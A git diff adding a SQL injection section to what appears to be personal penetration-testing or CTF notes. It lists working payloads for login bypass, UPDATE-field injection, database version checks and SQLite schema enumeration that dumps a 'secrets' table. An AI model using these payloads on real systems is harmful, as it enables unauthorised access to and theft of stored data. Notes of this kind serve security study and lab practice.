@@ -57,3 +57,21 @@ $ ./enum4linux.pl <options> <ip>
 * nmap xxx
   * Service Info: Host: Os:
 * https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388
+
+<hr class="sep-both">
+
+# SQL
+
+* Input Box String: usual
+* Input Box Non-String: when there is no quotes: `'' OR 1=1-- -`
+* If you have trouble via a form (client-side verification) intercept the request
+* Look into the field name to guess column names
+* Update
+  * none',nickName='lol
+* Version
+  * (SELECT banner FROM v$version)
+  * sqlite_version()
+    * SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
+    * ',nickName=(SELECT group_concat(tbl_name, '<br>') FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='
+    * ',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='
+    * ',nickName=(SELECT group_concat(id || ":" || author || ":" || secret, '<br>') FROM secrets),email='
